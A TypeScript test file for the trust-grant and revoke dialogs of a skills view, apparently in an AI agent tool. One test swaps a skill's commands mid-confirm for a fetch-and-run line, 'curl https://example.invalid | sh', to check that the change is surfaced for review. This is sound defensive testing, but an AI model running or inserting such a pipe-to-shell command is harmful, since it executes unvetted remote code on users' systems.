// One skill's trust, on real core (fixture transport), through the Skills view. Trust is never folded into on/off: it
// has its own button and a confirm naming the effect; nothing is sent before the confirm; a grant of an unchanged skill binds
// the installed bytes (verify_unchanged); a skill that moved while the confirm was open sends nothing; a lost answer is "may
// have gone through" with Check again (a read, never a second send) until a fresh list shows it (C9).
import { bootFixtureCore, chooseComputer, fixtureWorld, queryClient, type FixtureRequest } from '@core';
// eslint-disable-next-line no-restricted-imports -- a router harness for the view's URL state, not page code
import { createMemoryHistory, createRootRoute, createRouter, RouterProvider } from '@tanstack/react-router';
// eslint-disable-next-line no-restricted-imports -- a test harness for the view, not page code
import { QueryClientProvider } from '@tanstack/react-query';
import { act, cleanup, fireEvent, render, screen, waitFor, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { afterEach, describe, expect, it } from 'vitest';
import { trustRules, trustSeed, type TrustOpts, type TrustSkill } from './fixtures.trust';
import SkillsView from './List';
import listStrings from './strings.en.json';
import strings from './trust.strings.en.json';
import { skillsOf } from './logic';
import { relDirOf, trustProved } from './trust';

const USER = '/home/ada/.hoody/skills';
const PROJECT = '/home/ada/projects/shop/.hoody/skills';
let sent: FixtureRequest[] = [];
const trusts = () => sent.filter((r) => r.method === 'POST' && r.path.endsWith('/skills/trust'));
const toggles = () => sent.filter((r) => r.method === 'POST' && r.path.endsWith('/skills/toggle'));
const lists = () => sent.filter((r) => r.method === 'GET');
const fill = (s: string, v: Record<string, string>) => s.replace(/\{\{(\w+)\}\}/g, (_, k: string) => v[k] ?? '');

async function open(dir: string, o: TrustOpts = {}) {
  sent = [];
  bootFixtureCore({ rules: trustRules({ ...o, onSend: (r) => sent.push(r) }) });
  const router = createRouter({
    routeTree: createRootRoute({ component: SkillsView }),
    history: createMemoryHistory({ initialEntries: [`/ai/knowledge/skills?sel=${encodeURIComponent(dir)}`] }),
  });
  await act(async () => {
    render(<QueryClientProvider client={queryClient}><RouterProvider router={router} /></QueryClientProvider>);
    await router.load();
  });
  await screen.findByRole('heading', { name: listStrings['trust.title'] });
}
const grantBtn = () => screen.findByRole('button', { name: strings['grant.open'] });
const revokeBtn = () => screen.findByRole('button', { name: strings['revoke.open'] });
const dialog = () => screen.findByRole('alertdialog');
const reread = () => act(async () => { await queryClient.invalidateQueries(); });

afterEach(() => {
  cleanup();
  queryClient.clear();
});

describe('trust is its own action with a confirm naming the effect', () => {
  it('opening the confirm sends nothing; it names the effect and lists the commands, files, tools and where it came from', async () => {
    await open(`${USER}/deploy-check`);
    await userEvent.click(await grantBtn());
    const d = within(await dialog());
    expect(d.getByText(fill(strings['grant.effectCommands'], { name: 'deploy-check' }))).toBeInTheDocument();
    // The commands as one shell block (CodeBlock: a figure named for them).
    expect(d.getByRole('figure', { name: strings['grant.commands'] }).textContent).toContain('git status --short');
    expect(d.getByText('skill hub · hoody/deploy-check')).toBeInTheDocument();
    expect(d.getByText(`${USER}/deploy-check`)).toBeInTheDocument();
    expect(d.getByText(strings['grant.bindInstalled'])).toBeInTheDocument();
    expect(trusts()).toHaveLength(0);
    await userEvent.click(d.getByRole('button', { name: /cancel/i }));
    await waitFor(() => expect(screen.queryByRole('alertdialog')).toBeNull());
    expect(trusts()).toHaveLength(0);
  });

  it('confirming sends one grant naming the skill by root and folder, bound to the installed files, and never on/off', async () => {
    await open(`${USER}/deploy-check`);
    await userEvent.click(await grantBtn());
    await userEvent.click(within(await dialog()).getByRole('button', { name: strings['grant.confirm'] }));
    expect(await screen.findByText(fill(strings['done.grant'], { name: 'deploy-check' }))).toBeInTheDocument();
    expect(trusts()).toHaveLength(1);
    expect(trusts()[0]!.body).toEqual({ root_dir: USER, rel_dir: 'deploy-check', trusted: true, verify_unchanged: true });
    expect(toggles()).toHaveLength(0);
    await waitFor(() => expect(screen.getAllByText(listStrings['trust.trusted']).length).toBeGreaterThan(0));
  });

  it('a skill changed since install says so, trusts the files as they are when applied, and sends no install binding', async () => {
    await open(`${USER}/lint-fix`);
    await userEvent.click(await grantBtn());
    const d = within(await dialog());
    expect(d.getByText(strings['grant.changed'])).toBeInTheDocument();
    expect(d.getByText(strings['grant.bindNow'])).toBeInTheDocument();
    await userEvent.click(d.getByRole('button', { name: strings['grant.confirm'] }));
    await screen.findByText(fill(strings['done.grant'], { name: 'lint-fix' }));
    expect(trusts()[0]!.body).toEqual({ root_dir: USER, rel_dir: 'lint-fix', trusted: true });
  });

  it('a skill with no commands names only the instructions', async () => {
    const store = trustSeed();
    store.find((s) => s.name === 'sql-review')!.trust = { level: 'untrusted', provider: 'skill hub', ref_source: 'hoody/sql-review' };
    await open(`${USER}/sql-review`, { store });
    await userEvent.click(await grantBtn());
    const d = within(await dialog());
    expect(d.getByText(fill(strings['grant.effect'], { name: 'sql-review' }))).toBeInTheDocument();
    expect(d.queryByRole('figure', { name: strings['grant.commands'] })).toBeNull();
  });

  it('a skill made here and a broken one offer no trust action', async () => {
    await open(`${PROJECT}/release-notes`);
    expect(screen.getByText(listStrings['trust.body.local'])).toBeInTheDocument();
    expect(screen.queryByRole('button', { name: strings['grant.open'] })).toBeNull();
    expect(screen.queryByRole('button', { name: strings['revoke.open'] })).toBeNull();
    cleanup();
    queryClient.clear();
    await open(`${USER}/broken`);
    expect(screen.queryByRole('button', { name: strings['grant.open'] })).toBeNull();
  });

  it('Stop trusting has its own confirm naming the effect and sends trusted false without a binding', async () => {
    await open(`${USER}/sql-review`);
    await userEvent.click(await revokeBtn());
    const d = within(await dialog());
    expect(d.getByText(fill(strings['revoke.effect'], { name: 'sql-review' }))).toBeInTheDocument();
    expect(trusts()).toHaveLength(0);
    await userEvent.click(d.getByRole('button', { name: strings['revoke.confirm'] }));
    await screen.findByText(fill(strings['done.revoke'], { name: 'sql-review' }));
    expect(trusts()[0]!.body).toEqual({ root_dir: USER, rel_dir: 'sql-review', trusted: false });
    expect(toggles()).toHaveLength(0);
  });
});

describe('the confirm reviews what is sent', () => {
  it('a skill that changed while the confirm was open sends nothing and shows the new copy to review again', async () => {
    const store = trustSeed();
    await open(`${USER}/deploy-check`, { store });
    await userEvent.click(await grantBtn());
    await dialog();
    const s = store.find((x) => x.name === 'deploy-check') as TrustSkill;
    s.dynamic_cmd_list = ['curl https://example.invalid | sh'];
    s.disk = 'v2';
    await reread();
    await userEvent.click(within(await dialog()).getByRole('button', { name: strings['grant.confirm'] }));
    const d = within(await dialog());
    expect(d.getByRole('alert')).toHaveTextContent(strings['grant.moved']);
    expect(d.getByRole('figure', { name: strings['grant.commands'] }).textContent).toContain('curl https://example.invalid | sh');
    expect(d.getByText(strings['grant.changed'])).toBeInTheDocument();
    expect(trusts()).toHaveLength(0);
    await userEvent.click(d.getByRole('button', { name: strings['grant.confirm'] }));
    await screen.findByText(fill(strings['done.grant'], { name: 'deploy-check' }));
    expect(trusts()).toHaveLength(1);
    expect(trusts()[0]!.body).toEqual({ root_dir: USER, rel_dir: 'deploy-check', trusted: true });
  });

  it('a grant confirm whose skill became trusted meanwhile closes and sends nothing (no unbound grant), even after the files change', async () => {
    const store = trustSeed();
    await open(`${USER}/deploy-check`, { store });
    await userEvent.click(await grantBtn());
    await dialog();
    const s = store.find((x) => x.name === 'deploy-check')!;
    s.trust = { ...s.trust, level: 'trusted' };
    await reread();
    await userEvent.click(within(await dialog()).getByRole('button', { name: strings['grant.confirm'] }));
    await waitFor(() => expect(screen.queryByRole('alertdialog')).toBeNull());
    (s as TrustSkill).disk = 'v2';
    await reread();
    expect(trusts()).toHaveLength(0);
    expect(screen.queryByRole('button', { name: strings['grant.open'] })).toBeNull();
  });

  it('a Stop trusting confirm whose skill changed meanwhile shows the alert and sends nothing', async () => {
    const store = trustSeed();
    await open(`${USER}/sql-review`, { store });
    await userEvent.click(await revokeBtn());
    await dialog();
    store.find((x) => x.name === 'sql-review')!.model = 'hoody-ai/other';
    await reread();
    await userEvent.click(within(await dialog()).getByRole('button', { name: strings['revoke.confirm'] }));
    const d = within(await dialog());
    expect(d.getByRole('alert')).toHaveTextContent(strings['grant.moved']);
    expect(trusts()).toHaveLength(0);
  });

  it('two presses of the confirm send one grant', async () => {
    await open(`${USER}/deploy-check`, { notApplied: true });
    await userEvent.click(await grantBtn());
    const b = within(await dialog()).getByRole('button', { name: strings['grant.confirm'] });
    fireEvent.click(b);
    fireEvent.click(b);
    await screen.findByText(fill(strings['held.grant'], { name: 'deploy-check' }));
    expect(trusts()).toHaveLength(1);
  });

  it('a confirm opened on one computer sends nothing after the top bar moved to another', async () => {
    const other = fixtureWorld.computers.find((c) => c.name === 'borealis')!;
    const atlas = fixtureWorld.computers.find((c) => c.name === 'atlas')!;
    await open(`${USER}/deploy-check`);
    // Both lists read once, so the switch renders the other computer's same-folder skill at once.
    await act(async () => { chooseComputer(other); });
    await waitFor(() => expect(lists().some((r) => r.target?.container.id === other.id)).toBe(true));
    await act(async () => { chooseComputer(atlas); });
    await userEvent.click(await grantBtn());
    await dialog();
    await act(async () => { chooseComputer(other); });
    // The other computer's detail is another mount: the confirm closes (Trust.tsx samePlace also refuses a press, should a
    // later layout keep it open).
    const d = screen.queryByRole('alertdialog');
    if (d) await userEvent.click(within(d).getByRole('button', { name: strings['grant.confirm'] }));
    await waitFor(() => expect(screen.queryByRole('alertdialog')).toBeNull());
    expect(await grantBtn()).toBeEnabled();
    expect(trusts()).toHaveLength(0);
  });

  it('files changed on disk after the list was read: the agent refuses the grant, shown as refused (nothing changed), never unknown', async () => {
    const store = trustSeed();
    await open(`${USER}/deploy-check`, { store });
    (store.find((x) => x.name === 'deploy-check') as TrustSkill).disk = 'v2';
    await userEvent.click(await grantBtn());
    await userEvent.click(within(await dialog()).getByRole('button', { name: strings['grant.confirm'] }));
    expect(await screen.findByText(strings['err.refusedGrant'])).toBeInTheDocument();
    expect(document.querySelector('[data-outcome="failed"]')).not.toBeNull();
    expect(trusts()).toHaveLength(1);
    expect(await grantBtn()).toBeEnabled();
  });

  it('no install record on the computer: refused with its own words', async () => {
    const store = trustSeed();
    await open(`${USER}/deploy-check`, { store });
    delete store.find((x) => x.name === 'deploy-check')!.trust;
    await userEvent.click(await grantBtn());
    await userEvent.click(within(await dialog()).getByRole('button', { name: strings['grant.confirm'] }));
    expect(await screen.findByText(strings['err.notFound'])).toBeInTheDocument();
    expect(document.querySelector('[data-outcome="failed"]')).not.toBeNull();
  });
});

describe('a lost answer (C9)', () => {
  it('lost after it applied: the fresh list proves it, it ends trusted, never failed, sent once', async () => {
    await open(`${USER}/deploy-check`, { lost: true });
    await userEvent.click(await grantBtn());
    await userEvent.click(within(await dialog()).getByRole('button', { name: strings['grant.confirm'] }));
    expect(await revokeBtn()).toBeEnabled();
    expect(document.querySelector('[data-outcome="pending"]')).toBeNull();
    expect(document.querySelector('[data-outcome="failed"]')).toBeNull();
    expect(trusts()).toHaveLength(1);
    expect(lists().length).toBeGreaterThan(1);
  });

  it('held, then applied on the computer: both actions locked; Check again proves it by a read and sends nothing again', async () => {
    const store = trustSeed();
    await open(`${USER}/deploy-check`, { store, notApplied: true });
    await userEvent.click(await grantBtn());
    await userEvent.click(within(await dialog()).getByRole('button', { name: strings['grant.confirm'] }));
    expect(await screen.findByText(fill(strings['held.grant'], { name: 'deploy-check' }))).toBeInTheDocument();
    expect(document.querySelector('[data-outcome="pending"]')).not.toBeNull();
    expect(await grantBtn()).toBeDisabled();
    const s = store.find((x) => x.name === 'deploy-check')!;
    s.trust = { ...s.trust, level: 'trusted' };
    const before = lists().length;
    await userEvent.click(await screen.findByRole('button', { name: /check again/i }));
    expect(await revokeBtn()).toBeEnabled();
    await waitFor(() => expect(document.querySelector('[data-outcome="pending"]')).toBeNull());
    expect(lists().length).toBeGreaterThan(before);
    expect(trusts()).toHaveLength(1);
  });

  it('while held, pressing the locked button opens no confirm and sends nothing', async () => {
    await open(`${USER}/deploy-check`, { notApplied: true });
    await userEvent.click(await grantBtn());
    await userEvent.click(within(await dialog()).getByRole('button', { name: strings['grant.confirm'] }));
    await screen.findByText(fill(strings['held.grant'], { name: 'deploy-check' }));
    await waitFor(() => expect(screen.queryByRole('alertdialog')).toBeNull());
    await userEvent.click(await grantBtn());
    expect(screen.queryByRole('alertdialog')).toBeNull();
    expect(trusts()).toHaveLength(1);
  });

  it('lost and not applied: Check again keeps it held, no second send; Stop tracking frees it', async () => {
    await open(`${USER}/deploy-check`, { notApplied: true });
    await userEvent.click(await grantBtn());
    await userEvent.click(within(await dialog()).getByRole('button', { name: strings['grant.confirm'] }));
    await screen.findByText(fill(strings['held.grant'], { name: 'deploy-check' }));
    expect(await grantBtn()).toBeDisabled();
    await userEvent.click(await screen.findByRole('button', { name: /check again/i }));
    await waitFor(() => expect(lists().length).toBeGreaterThan(1));
    expect(document.querySelector('[data-outcome="pending"]')).not.toBeNull();
    expect(trusts()).toHaveLength(1);
    await userEvent.click(screen.getByRole('button', { name: strings.dismiss }));
    await userEvent.click(within(await dialog()).getByRole('button', { name: strings.dismiss }));
    await waitFor(() => expect(document.querySelector('[data-outcome="pending"]')).toBeNull());
    expect(await grantBtn()).toBeEnabled();
    expect(trusts()).toHaveLength(1);
    // A new press after Stop tracking goes through the confirm again and is one more send.
    await userEvent.click(await grantBtn());
    await userEvent.click(within(await dialog()).getByRole('button', { name: strings['grant.confirm'] }));
    await screen.findByText(fill(strings['held.grant'], { name: 'deploy-check' }));
    expect(trusts()).toHaveLength(2);
  });

  it('a store failure (500) is unknown, never failed', async () => {
    await open(`${USER}/deploy-check`, { failStore: true });
    await userEvent.click(await grantBtn());
    await userEvent.click(within(await dialog()).getByRole('button', { name: strings['grant.confirm'] }));
    await screen.findByText(fill(strings['held.grant'], { name: 'deploy-check' }));
    expect(document.querySelector('[data-outcome="failed"]')).toBeNull();
  });

  it('busy (503 service_unavailable) is a definite refusal', async () => {
    await open(`${USER}/deploy-check`, { busy: true });
    await userEvent.click(await grantBtn());
    await userEvent.click(within(await dialog()).getByRole('button', { name: strings['grant.confirm'] }));
    await waitFor(() => expect(document.querySelector('[data-outcome="failed"]')).not.toBeNull());
  });
});

describe('trust logic', () => {
  it('relDirOf takes the folder under its root, and nothing when it is not under it', () => {
    expect(relDirOf({ id: `${USER}/a`, rootDir: USER })).toBe('a');
    expect(relDirOf({ id: `${USER}/a/b`, rootDir: `${USER}/` })).toBe('a/b');
    expect(relDirOf({ id: `${USER}x/a`, rootDir: USER })).toBeNull();
    expect(relDirOf({ id: `${USER}/../a`, rootDir: USER })).toBeNull();
    expect(relDirOf({ id: USER, rootDir: USER })).toBeNull();
    expect(relDirOf({ id: `${USER}/a`, rootDir: '' })).toBeNull();
  });

  it('trustProved: only a list of the same computer and realm showing the value sent; changed proves nothing', () => {
    const id = { computer: 'c1', realm: 'global', dir: '/d', trusted: true };
    const list = (computer: string, realm: string, trust: string) => [{ items: [{ id: '/d', trust }], computer, realm, complete: true }];
    expect(trustProved(id, [list('c1', 'global', 'trusted')])).toBe('applied');
    expect(trustProved(id, [list('c2', 'global', 'trusted')])).toBeUndefined();
    expect(trustProved(id, [list('c1', 'aaaaaaaaaaaaaaaaaaaaaaaa', 'trusted')])).toBeUndefined();
    expect(trustProved(id, [list('c1', 'global', 'changed')])).toBeUndefined();
    expect(trustProved({ ...id, trusted: false }, [list('c1', 'global', 'untrusted')])).toBe('applied');
    expect(trustProved({ ...id, trusted: false }, [list('c1', 'global', 'changed')])).toBeUndefined();
    expect(trustProved({ ...id, trusted: false }, [list('c1', 'global', 'trusted')])).toBeUndefined();
  });

  it('trustProved: a list row whose trust record is malformed is no row, so it proves nothing', () => {
    const id = { computer: 'c1', realm: 'global', dir: '/d', trusted: true };
    const row = { name: 'n', dir: '/d', root_id: 'user', root_dir: '/', rel_dir: 'd', realm: 'global' };
    const read = (trust: unknown) => [skillsOf({ items: [{ ...row, trust }], meta: { total: 1 } }, { computer: 'c1', realm: 'global' })];
    expect(trustProved(id, [read({ level: 'trusted' })])).toBe('applied');
    expect(trustProved(id, [read({ level: 'weird' })])).toBeUndefined();
    expect(trustProved(id, [read({ level: 'trusted', tampered: 'no' })])).toBeUndefined();
  });
});
